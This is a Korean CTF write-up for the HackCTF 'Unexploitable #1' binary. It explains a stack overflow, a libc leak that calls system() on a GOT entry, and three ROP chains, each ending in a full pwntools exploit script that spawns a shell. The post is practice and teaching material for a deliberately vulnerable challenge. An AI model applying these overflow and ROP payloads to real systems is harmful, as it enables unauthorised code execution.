---
layout: post
title:  "HackCTF Unexploitable #1 write-up"
date:   2020-02-03 19:45:55
image:  hackctf_unex1.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled.png)

이번에도 동일하게 NX 비트를 제외하곤 딱히 걸려있는게 없다. GOT overwrite는 가능하다
<br><br><br>
**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%201.png)

바이너리를 한번 실행시키면 한번의 입력을 받고 바로 종료가 된다.
<br><br><br>
**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%202.png)

코드는 간단하다. fwrite를 통해 문자열이 출력된 뒤, fgets로 입력을 받는다. 64바이트만큼 입력이 가능하기 때문에 ret를 덮을수 있다. 

또한 추가적으로 gitf라는 함수가 제공된다
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%203.png)

일반적으로 시스템함수의 인자로는 명령어를 줘야한다. 하지만 명령어가 아닌 다른 값을 주게 된다면 다음과 같이 에러 메시지를 출력해준다
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%204.png)

현재 위 코드는 b변수에 aaaa라는 값을 입력하고 system(&b) 을 출력했을때의 화면이다.

b의 주소를 system함수의 인자로 주게되면 b에 들어있는 값을 출력하면서 not found를 출력하게 된다.

이를 이용해서 system함수의 인자로 fgets의 got를 주게된다면 fgets의 libc 주소를 leak할수 있게 된다. 이를 이용해서 ROP를 구성하면 된다
<br><br><br><br>
### 2. 접근방법

---

ROP를 진행하기위해 필요한 값들을 정리해보자

- **libc base 주소**

    ret를 system_plt로 주고 인자로 fgets_got를 주어서 fgets 주소를 얻어야함.

    그 후 libc database를 이용하여 libc 버전을 확인하여 fgets의 오프셋을 구해 libc_base를 구하면 됨
<br><br>
- **/bin/sh 주소**

    위에서 libc_base를 구했으므로 /bin/sh의 offset을 이용하여 /bin/sh 주소가 있는 문자열을 구하면 됨
    
<br><br>
최종 페이로드는 다음과 같다

- **payload_1**

    ret(pop rdi; ret;) + fgets_got + system_plt + main_addr

- **payload_2**

    ret(pop rdi; ret;) + /bin/sh주소 + system_plt
<br><br><br><br>
### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context.log_level="DEBUG"
p=remote("ctf.j0n9hyun.xyz", 3023)
#p=process("./Unexploitable_1",aslr=False)
#gdb.attach(p)

e=ELF("./Unexploitable_1")

p.recvuntil("plt!\n")
payload="A"*0x18
payload+=p64(0x00000000004007d3) #pop rdi ret;
payload+=p64(e.got["fgets"])
payload+=p64(e.plt["system"])
payload+=p64(0x00000000004006dc)
p.sendline(payload)
p.recvuntil("sh: 1: ")
libc_base=u64(p.recv(6).ljust(8,"\x00"))-0x06dad0 #fgets_offset
log.info("base adr :: "+hex(libc_base))

payload2="A"*0x18
payload2+=p64(0x00000000004007d3) 
payload2+=p64(libc_base+0x18cd57) # /bin/sh offset
payload2+=p64(libc_base+0x045390)

p.sendline(payload2)
p.interactive()
```
<br><br><br><br>
### 4. 몰랐던 개념

---

해당 문제를 푸는 다른 방법이 존재한다.

1. **fflush 문자열 이용하기**

    system함수에 "/bin/sh" 말고도 "sh" 이렇게 인자를 줘도 쉘이 떨어진다. 아이다에서 .LOAD 영역을 확인해보면 fflush 함수의 문자열이 저장되어 있다. 해당 문자열에서 sh를 가져와서 바로 system함수의 인자로 주면  간단하게 해결된다.
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%205.png)

    0x4003BB의 위치에 fflush 가 저장되어있다. 따라서 0x4003BF를 인자로 주면 된다

    - payload  
        ret(pop rdi; ret;) + sh(0x4003BF) + system_plt

    최종 익스코드
```python
    from pwn import *
    context.log_level="DEBUG"
    p=remote("ctf.j0n9hyun.xyz", 3023)
    #p=process("./Unexploitable_1",aslr=False)
    #gdb.attach(p)
    
    e=ELF("./Unexploitable_1")
    
    payload="A"*0x18
    payload+=p64(0x00000000004007d3) # pop rbp ret
    payload+=p64(0x4003bf)   # .bss
    payload+=p64(e.plt['system']) # fgets 113
    
    p.recvuntil("\n")
    p.sendline(payload)
    p.interactive()
```

<br><br>
2. **pop rbp; ret 이용하기**

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%206.png)

    중요한 점은 시스템함수의 인자인 /bin/sh를 어떻게 처리하여 쉘을 얻을것이냐이다.

    1번의 방법이 아닌 다른 방법으로는, fgets함수를 재호출하여 .bss 영역같은 고정영역에 "/bin/sh"를 저장하면되지만, 3개의 인자를 처리할 수 있는 적절한 가젯을 찾을순 없다.

    잘 보면 위 사진에서 rbp-0x10의 위치에 입력한 데이터를 저장한다. 이 rbp를 .bss영역으로 변경해주면 원하는 영역에 데이터를 쓸수 있다.
<br><br><br>
    따라서 bof를 이용하여 **" ret(pop rbp; ret;) + .bss addr + main_113라인"** 이렇게 입력하게 되면 메인+143라인인 ret가 진행될때 pop rbp로 이동하게 되고, 현재 rsp는 .bss의 주소를 가리키게 된다. 여기서 pop rbp가 진행되어 .bss_addr가 rbp에 담기고 rsp는 증가하여 main_113라인 부분을 가리키게 된다.

    그다음 ret가 진행되어 main+113로 다시 돌아가게된다. 현재 rbp는 .bss의 주소를 가리키고 있으므로 이번에 fgets을 통한 입력값은 .bss로 들어가게된다.
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%207.png)

    위 사진을 보면 pop rbp가 진행되면 0x601970이 rbp로 들어간다. 이부분이 .bss영역이다. 단 main+113에서 rbp-0x10을 참조하므로 .bss 영역의 원하는 값 + 0x10 입력해줘야 한다.
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%208.png)

    main+113으로 돌아왔을때의 상황이다. 현 rbp를 보면 0x601970으로 바뀐것을 확인 할 수 있다. 여기서 이제 fgets가 호출되면 0x601970으로 /bin/sh를 보내면 된다. 그다음 ret 진행될때를 보면
<br><br><br>
    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%209.png)

    호출되는 주소가 우리가 입력한 .bss 주소 + 0x18 의 위치에 있는 값이다. 따라서 +0x10만큼 더미값을 채워주고  **"pop rdi; ret;" + /bin/sh 주소 + "gift+9위치"** 이렇게 붙여주면된다. gift+9로 돌아가는 이유는 rdi에 이상한 문자열을 넣는 부분을 건너띄고 우리고 넣은 rdi로 system함수를 호출하기 위함이다.
<br><br><br>
    정리하자면 우리가 입력한 .bss(0x601960) 을 기준으로 +0x18에서 ret가 한번 호출되고, 그다음 +0x28 위치에서 한번더 ret가 호출된다.
<br><br><br>

    최종익스코드는 다음과 같다
    
```python
from pwn import *
context.log_level="DEBUG"
#p=remote("ctf.j0n9hyun.xyz", 3023)
p=process("./Unexploitable_1",aslr=False)
gdb.attach(p)

e=ELF("./Unexploitable_1")

payload="A"*0x18
payload+=p64(0x0000000000400630) # pop rbp ret
payload+=p64(0x0000000000601060+0x10+0x900)   # .bss
payload+=p64(0x000000000040074d) # main+113

p.recvuntil("\n")
p.sendline(payload)

payload2="/bin/sh\x00"+"B"*0x10+p64(0x00000000004007d3)+p64(0x0000000000601060+0x900)+p64(0x00000000004006cf)+"\x00"
p.sendline(payload2)
p.interactive()
```

<br><br>
참고로 .bss 영역에서 +0x900을 해준 이유는 다음과 같다

.bss영역의 주소는 "readelf -S 바이너리 " 를 이용해서 구하였는데 처음에 구한 주소는 0x601060 이였다. 이 주소를 가지고 익스를 진행하면 system 함수의 처리 로직 중에 **_dl_runtime_resolve_xsave+15**  부분에서 에러가 발생한다.
<br><br>
그 이유는 

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20Unexploitable%201/Untitled%2010.png)

**_dl_runtime_resolve_xsave+15** 이 부분에서 [rsp]에 값을 복사하는데, 해당 영역은 쓰기 권한이 없으므로 에러가 나는 것이다. 따라서 해당 부분이 실행될 때 쓰기 권한이 존재하는 영역에서 진행될수 있게 적당히 +0x900을 넣어준것이다. (틀리면 말해주십쇼)